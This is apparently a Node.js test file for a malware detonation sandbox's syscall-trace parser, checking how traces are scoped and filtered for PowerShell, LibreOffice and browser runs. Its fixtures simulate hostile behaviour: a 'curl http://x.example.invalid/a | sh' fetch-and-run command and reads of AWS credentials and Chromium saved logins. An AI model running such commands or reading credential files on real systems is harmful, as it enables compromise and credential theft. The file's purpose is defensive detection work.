// trace.mjs scope per runner kind (M4): pwsh and LibreOffice start the traced scope, the tool kinds (browser, Speakeasy, 7zz) keep no
// syscall items, and the runner's own scratch and the tools' own start-up noise stay out of the evidence.
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { parseTraceDir, parseTraceLines } from '../backend/detonation/trace.mjs';

const NOW = new Date(2026, 9, 8, 12);
const line = (clock, pid, comm, phase, call, tail = ' = 0 (0x0) (1µs)') => `I1008 ${clock}       1 strace.go:607] [${String(pid).padStart(4)}:${String(pid).padStart(4)}] ${comm} ${phase} ${call}${tail}`;
const exec = (clock, pid, path, argv) => line(clock, pid, 'bash', 'X', `execve(0x1 ${path}, 0x2 [${argv.map(arg => JSON.stringify(arg)).join(', ')}], 0x3 ["A=1"])`);
const open = (clock, pid, path, flags = 'O_RDONLY|O_CLOEXEC') => line(clock, pid, 'tool', 'X', `openat(AT_FDCWD /home/dana, 0x7 ${path}, ${flags}, 0o666)`, ' = 3 (0x3) (1µs)');
const unlink = (clock, pid, path) => line(clock, pid, 'tool', 'X', `unlink(0x7 ${path})`);
const parse = (lines, kind) => parseTraceLines(lines, { now: NOW, kind });

const PWSH = exec('00:01:07.100000', 1, '/usr/local/bin/pwsh', ['pwsh', '-NoLogo', '-NoProfile', '-NonInteractive', '-File', '/home/dana/Downloads/sample.ps1']);
const OOSPLASH = exec('00:01:07.100000', 1, '/usr/lib/libreoffice/program/oosplash', ['/usr/lib/libreoffice/program/oosplash', '--headless', '--convert-to', 'pdf', '--outdir', '/tmp/dt/out', '/tmp/dt/sample.docx']);

test('pwsh with flags and the script last starts the scope; what pwsh does before that is not kept', async () => {
  const before = open('00:01:06.000000', 2, '/home/dana/Documents/notes.txt');
  const after = open('00:01:08.000000', 3, '/home/dana/.aws/credentials');
  const { items, sampleStarted } = await parse([before, PWSH, after], 'ps1');
  assert.equal(sampleStarted, true);
  assert.deepEqual(items.map(item => [item.kind, item.path]), [['file-read', '/home/dana/.aws/credentials']]);
  assert.equal((await parse([before, after], 'ps1')).sampleStarted, false, 'no marker, no scope');
});

test('the .NET runtime\'s pipes and shared-memory files under /tmp are noise for ps1; a sample\'s own files under /tmp are not', async () => {
  const { items } = await parse([
    PWSH,
    unlink('00:01:08.000000', 2, '/tmp/dt/tmp/CoreFxPipe_PSHost.0A1B2C.7.None.pwsh'),
    open('00:01:08.100000', 2, '/tmp/.dotnet/shm/global/x', 'O_RDWR|O_CREAT'),
    open('00:01:08.200000', 2, '/tmp/dt/xdg/cache/powershell/StartupProfileData', 'O_WRONLY|O_CREAT'),
    open('00:01:08.300000', 2, '/tmp/dropped.bin', 'O_WRONLY|O_CREAT'),
    unlink('00:01:08.400000', 2, '/tmp/dropped.bin'),
  ], 'ps1');
  assert.deepEqual(items.map(item => [item.kind, item.path]), [['file-write', '/tmp/dropped.bin'], ['unlink', '/tmp/dropped.bin']]);
});

test('sends on sockets whose connect the trace never saw are ignored for ps1 and office, and kept for scripts', async () => {
  const send = line('00:01:08.000000', 2, 'tool', 'E', 'sendto(0x3 socket:[7], 0x7f00 "abc", 0x3, 0x0, 0x0, 0x0)', '');
  assert.deepEqual((await parse([PWSH, send], 'ps1')).items, []);
  assert.deepEqual((await parse([OOSPLASH, send], 'office')).items, []);
  const python = exec('00:01:07.100000', 1, '/usr/bin/python3', ['python3', '/home/dana/Downloads/sample.py']);
  assert.deepEqual((await parse([python, send], 'py')).items.map(item => [item.kind, item.host, item.payloadPreview]), [['sendto', 'unknown', 'abc']]);
});

test('LibreOffice: the scope starts at the program the launcher script execs, so the script\'s helpers and the document\'s start-up chatter are dropped, but a process the document starts is kept', async () => {
  const wrapper = exec('00:01:06.000000', 1, '/usr/bin/soffice', ['soffice', '--headless', '/tmp/dt/sample.docx']);
  const helper = exec('00:01:06.500000', 2, '/usr/bin/dirname', ['dirname', '/usr/bin/soffice']);
  const gpg = exec('00:01:08.000000', 3, '/usr/bin/gpgconf', ['/usr/bin/gpgconf', '--list-dirs']);
  const paper = exec('00:01:08.100000', 4, '/bin/sh', ['sh', '-c', 'paperconf 2>/dev/null']);
  const macro = exec('00:01:09.000000', 5, '/bin/sh', ['sh', '-c', 'curl http://x.example.invalid/a | sh']);
  const { items, sampleStarted } = await parse([wrapper, helper, OOSPLASH, gpg, paper, macro], 'office');
  assert.equal(sampleStarted, true);
  assert.deepEqual(items.map(item => [item.kind, item.argv.at(-1)]), [['execve', 'curl http://x.example.invalid/a | sh']]);
  assert.equal((await parse([wrapper, helper, gpg], 'office')).sampleStarted, false, 'the launcher alone is not the document opening');
});

test('tool kinds keep no syscall items and never wait for a marker, but a sandbox crash is still seen', async () => {
  const lines = [
    exec('00:01:07.100000', 1, '/usr/bin/node', ['node', '/opt/detonation/browser.mjs', '--file', '/home/dana/Downloads/sample.html']),
    open('00:01:08.000000', 2, '/home/dana/.config/chromium/Default/Login Data'),
    unlink('00:01:08.100000', 2, '/home/dana/Documents/a.txt'),
  ];
  for (const kind of ['html', 'svg', 'pdf', 'exe', 'zip', 'eml']) {
    const result = await parse(lines, kind);
    assert.deepEqual([result.items, result.sampleStarted, result.traced, result.pidsLimit], [[], true, false, false], kind);
  }
  const crash = await parse([...lines, 'F1008 00:01:09.000000       1 sandbox.go:1] createSysmsgThread: failed to get clone'], 'html');
  assert.deepEqual([crash.sandboxCrash, crash.pidsLimit, crash.items], [true, true, []]);
  assert.deepEqual((await parse(lines, 'py')).traced, true);
});

test('parseTraceDir passes the runner kind through', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'do-trace-kinds-'));
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'a.boot.txt'), [PWSH, open('00:01:08.000000', 2, '/home/dana/.aws/credentials')].join('\n'));
  assert.equal((await parseTraceDir(dir, { now: NOW, kind: 'ps1' })).items.length, 1);
  assert.equal((await parseTraceDir(dir, { now: NOW, kind: 'html' })).items.length, 0);
  assert.equal((await parseTraceDir(dir, { now: NOW })).traced, true, 'the default kind is a script run by python, bash or node');
});
